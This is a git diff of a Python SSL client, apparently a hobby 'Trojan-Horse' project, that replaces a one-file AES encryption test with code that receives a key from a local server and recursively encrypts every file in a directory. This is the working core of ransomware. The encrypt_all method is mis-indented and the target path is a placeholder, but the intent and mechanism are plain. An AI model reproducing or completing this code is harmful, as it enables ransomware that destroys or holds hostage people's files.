@@ -21,10 +21,11 @@ class my_client:
         print(f"sending message => {msg}")
         self.ssock.sendall(msg.encode())
 
-        answer = self.ssock.recv(1024)
-        file_path = "C:\\Users\\porat\\Downloads\\מועדון המתכנתים\\ssl_server\\Trojan-Horse\\shalev's computer\\22.PNG"
-        self.encrypt_file(file_path, answer)
-        self.decrypt_file(file_path + ".aes", "decrypted_22.PNG", answer)
+        key_bytes = self.ssock.recv(1024)
+        print(f"Received key bytes: {key_bytes}")
+
+        directory_path = "..." # Specify the directory to encrypt
+        self.encrypt_all(directory_path, key_bytes)
         self.ssock.close()
         
     def encrypt_file(self, file_path, key_bytes):
@@ -79,7 +80,14 @@ class my_client:
         except Exception as e:
             print(f"Decryption failed: {e}")
 
+        def encrypt_all(self,directory,key_bytes):
+            for dirpath, dirnames, filenames in os.walk(directory):
+                for filename in filenames:
+                    file_path = os.path.join(dirpath, filename)
+                    self.encrypt_file(file_path, key_bytes)
+                    print(f"Encrypted {file_path}")
 
+            print("All files encrypted.")
 if __name__ == "__main__":
     client = my_client("127.0.0.1", 12345)
     client.send_receive_message("HELLO SERVER!")
